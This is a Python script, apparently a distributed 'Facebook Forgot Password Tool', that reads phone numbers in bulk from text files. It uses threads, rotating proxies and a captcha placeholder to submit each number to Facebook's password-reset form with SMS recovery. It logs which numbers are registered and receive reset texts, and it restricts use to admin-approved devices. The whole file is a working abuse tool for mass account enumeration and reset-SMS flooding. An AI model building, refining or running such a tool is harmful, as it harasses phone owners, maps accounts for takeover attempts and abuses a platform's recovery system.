import os
import re
import time
import json
import threading
import hashlib
import glob
import requests
import cloudscraper
from colorama import Fore, Style, init
from bs4 import BeautifulSoup

init(autoreset=True)

# ================= BANNER =================
def show_banner():
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
{Fore.CYAN}║                                                          ║
{Fore.GREEN}║     ███████╗██████╗  ██████╗ ██████╗  ██████╗ ████████╗
{Fore.GREEN}║     ██╔════╝██╔══██╗██╔════╝ ██╔══██╗██╔═══██╗╚══██╔══╝
{Fore.GREEN}║     █████╗  ██████╔╝██║  ███╗██████╔╝██║   ██║   ██║   
{Fore.GREEN}║     ██╔══╝  ██╔══██╗██║   ██║██╔══██╗██║   ██║   ██║   
{Fore.GREEN}║     ██║     ██████╔╝╚██████╔╝██║  ██║╚██████╔╝   ██║   
{Fore.GREEN}║     ╚═╝     ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   
{Fore.CYAN}║                                                          ║
{Fore.YELLOW}║        🔓 Facebook Forgot Password Tool (SMS Only)      ║
{Fore.CYAN}║                                                          ║
{Fore.MAGENTA}║     Developed by {Fore.WHITE}MR Chowdhury                      ║
{Fore.MAGENTA}║     Telegram: {Fore.WHITE}@Mrchowdhury100                     ║
{Fore.CYAN}║                                                          ║
{Fore.CYAN}╚══════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(banner)

# ================= CONFIG =================
with open("config.json") as f:
    config = json.load(f)

THREADS = config.get("threads", 3)
TIMEOUT = config.get("timeout", 10)
ADMIN_ID = config.get("admin_id", "")

# ================= DEVICE APPROVAL =================
def get_device_id():
    info = os.popen("getprop ro.product.model 2>/dev/null || echo unknown").read().strip()
    info += os.popen("getprop ro.product.manufacturer 2>/dev/null || echo unknown").read().strip()
    info += os.popen("uname -a 2>/dev/null || echo unknown").read().strip()
    return hashlib.sha256(info.encode()).hexdigest()[:16]

def load_approved():
    if not os.path.exists("approved.json"):
        with open("approved.json", "w") as f:
            json.dump({"approved_devices": []}, f)
        return []
    with open("approved.json", "r") as f:
        data = json.load(f)
        return data.get("approved_devices", [])

def save_approved(devices):
    with open("approved.json", "w") as f:
        json.dump({"approved_devices": devices}, f, indent=4)

def is_approved(device_id):
    return device_id in load_approved()

def add_approved(device_id):
    devices = load_approved()
    if device_id not in devices:
        devices.append(device_id)
        save_approved(devices)
        return True
    return False

def remove_approved(device_id):
    devices = load_approved()
    if device_id in devices:
        devices.remove(device_id)
        save_approved(devices)
        return True
    return False

# ================= PROXY PARSER =================
def parse_proxy(proxy_str):
    """
    Supported formats:
    - host:port
    - user:pass@host:port
    """
    proxy_str = proxy_str.strip()
    
    # Check if auth is present
    if "@" in proxy_str:
        auth_part, host_part = proxy_str.split("@", 1)
        if ":" in auth_part:
            user, password = auth_part.split(":", 1)
        else:
            user, password = auth_part, ""
        return {
            "http": f"http://{user}:{password}@{host_part}",
            "https": f"https://{user}:{password}@{host_part}"
        }
    else:
        return {
            "http": f"http://{proxy_str}",
            "https": f"https://{proxy_str}"
        }

# ================= PROXY INPUT =================
def get_proxy_list():
    print(f"{Fore.CYAN}🌐 Proxy Settings")
    print(f"{Fore.YELLOW}[1] Skip (no proxy)")
    print(f"{Fore.YELLOW}[2] Enter single proxy (host:port or user:pass@host:port)")
    print(f"{Fore.YELLOW}[3] Load from proxies.txt (each line: host:port or user:pass@host:port)")
    choice = input("Select: ").strip()
    
    if choice == "1":
        return []
    elif choice == "2":
        proxy = input("Enter proxy: ").strip()
        if proxy:
            return [parse_proxy(proxy)]
        return []
    elif choice == "3":
        if os.path.exists("proxies.txt"):
            with open("proxies.txt", "r") as f:
                proxies = []
                for line in f:
                    line = line.strip()
                    if line:
                        proxies.append(parse_proxy(line))
                return proxies
        else:
            print(f"{Fore.RED}❌ proxies.txt not found!")
            return []
    else:
        return []

# ================= CAPTCHA SOLVER =================
def solve_captcha(site_key, page_url):
    print(f"{Fore.YELLOW}[!] Captcha detected! Solving...")
    return "MANUAL_CAPTCHA_SOLVED"

# ================= FACEBOOK FORGOT (SMS ONLY) =================
def forgot_password_sms(phone, proxy_dict=None):
    scraper = cloudscraper.create_scraper()
    
    if proxy_dict:
        scraper.proxies = proxy_dict
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    
    session = requests.Session()
    session.headers.update(headers)
    
    url = "https://www.facebook.com/login/identify/"
    resp = session.get(url, timeout=TIMEOUT)
    soup = BeautifulSoup(resp.text, "html.parser")
    
    form_data = {}
    for input_tag in soup.find_all("input"):
        name = input_tag.get("name")
        value = input_tag.get("value", "")
        if name:
            form_data[name] = value
    
    site_key = None
    for div in soup.find_all("div", {"data-sitekey": True}):
        site_key = div["data-sitekey"]
        break
    
    form_data["email"] = phone
    form_data["did_submit"] = "1"
    form_data["flow"] = "sms"
    
    if site_key:
        captcha_solution = solve_captcha(site_key, url)
        form_data["captcha"] = captcha_solution
    
    resp = session.post(url, data=form_data, timeout=TIMEOUT)
    
    if "checkpoint" in resp.url:
        return "✅ SMS sent"
    elif "confirm" in resp.url and "email" not in resp.url:
        return "✅ SMS sent"
    elif "recovery" in resp.url:
        return "✅ Recovery SMS available"
    elif "captcha" in resp.text.lower():
        return "❌ Captcha failed"
    elif "email" in resp.text.lower() and "sms" not in resp.text.lower():
        return "❌ Email only (SMS not available)"
    else:
        return "❌ Failed / Invalid"

# ================= LOAD NUMBERS FROM FOLDER =================
def load_numbers_from_folder(folder_path):
    numbers = set()
    
    if not os.path.exists(folder_path):
        print(f"{Fore.RED}❌ Folder not found: {folder_path}")
        return []
    
    txt_files = glob.glob(os.path.join(folder_path, "*.txt"))
    
    if not txt_files:
        print(f"{Fore.YELLOW}⚠️ No .txt files found in {folder_path}")
        return []
    
    print(f"{Fore.GREEN}[+] Found {len(txt_files)} .txt files")
    
    for file_path in txt_files:
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    num = re.sub(r'\D', '', line.strip())
                    if len(num) >= 10:
                        numbers.add(num)
        except Exception as e:
            print(f"{Fore.RED}❌ Error reading {file_path}: {e}")
    
    return list(numbers)

# ================= WORKER =================
def worker(numbers, results, proxy_list, thread_id):
    for idx, number in enumerate(numbers):
        proxy = proxy_list[idx % len(proxy_list)] if proxy_list else None
        result = forgot_password_sms(number.strip(), proxy)
        results.append((number, result))
        print(f"{Fore.CYAN}[T{thread_id}] {number} → {result}")
        log_action(number, result)

def log_action(phone, status):
    with open("logs.txt", "a") as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {phone} | {status}\n")

# ================= ADMIN PANEL =================
def admin_panel():
    print(f"{Fore.YELLOW}━━━ Admin Panel ━━━")
    print("1. Show approved devices")
    print("2. Add device")
    print("3. Remove device")
    print("4. Back")
    choice = input("Select: ").strip()
    
    if choice == "1":
        devices = load_approved()
        print(f"{Fore.CYAN}Approved devices: {devices}")
        input("Press Enter to continue...")
    elif choice == "2":
        dev_id = input("Enter device ID to approve: ").strip()
        if add_approved(dev_id):
            print(f"{Fore.GREEN}✅ Device {dev_id} approved!")
        else:
            print(f"{Fore.RED}❌ Already approved or invalid.")
        input("Press Enter to continue...")
    elif choice == "3":
        dev_id = input("Enter device ID to remove: ").strip()
        if remove_approved(dev_id):
            print(f"{Fore.GREEN}✅ Device {dev_id} removed!")
        else:
            print(f"{Fore.RED}❌ Not found.")
        input("Press Enter to continue...")

# ================= MAIN =================
def main():
    show_banner()
    
    device_id = get_device_id()
    print(f"{Fore.CYAN}[Device ID] {device_id}")
    
    if not is_approved(device_id):
        print(f"{Fore.RED}❌ Device not approved!")
        print(f"{Fore.YELLOW}Contact admin to approve this device.")
        if device_id == ADMIN_ID:
            print(f"{Fore.GREEN}⚠️ You are admin. Do you want to approve yourself?")
            if input("Approve? (y/n): ").lower() == "y":
                add_approved(device_id)
                print(f"{Fore.GREEN}✅ Device approved!")
            else:
                return
        else:
            return
    
    proxy_list = get_proxy_list()
    if proxy_list:
        print(f"{Fore.GREEN}[+] Loaded {len(proxy_list)} proxies")
    else:
        print(f"{Fore.YELLOW}[!] No proxy used (direct connection)")
    
    print(f"{Fore.CYAN}📁 Enter folder path containing .txt files")
    print(f"{Fore.YELLOW}Example: /sdcard/numbers/ or /storage/emulated/0/numbers/")
    folder_path = input("Path: ").strip()
    
    if not folder_path:
        print(f"{Fore.RED}❌ No path provided!")
        return
    
    numbers = load_numbers_from_folder(folder_path)
    
    if not numbers:
        print(f"{Fore.RED}❌ No numbers found in {folder_path}")
        return
    
    print(f"{Fore.GREEN}[+] Loaded {len(numbers)} numbers")
    
    chunk_size = max(1, len(numbers) // THREADS)
    chunks = [numbers[i:i+chunk_size] for i in range(0, len(numbers), chunk_size)]
    
    results = []
    threads = []
    
    for i, chunk in enumerate(chunks):
        t = threading.Thread(target=worker, args=(chunk, results, proxy_list, i+1))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    with open("report.txt", "w") as f:
        f.write("📊 Facebook Forgot Report (SMS Only)\n")
        f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        f.write(f"Source Folder: {folder_path}\n")
        f.write(f"Total Numbers: {len(numbers)}\n")
        f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
        for num, status in results:
            f.write(f"{num} → {status}\n")
    
    print(f"{Fore.GREEN}✅ Report saved to report.txt")
    
    if device_id == ADMIN_ID:
        if input("Open Admin Panel? (y/n): ").lower() == "y":
            admin_panel()

if __name__ == "__main__":
    main()
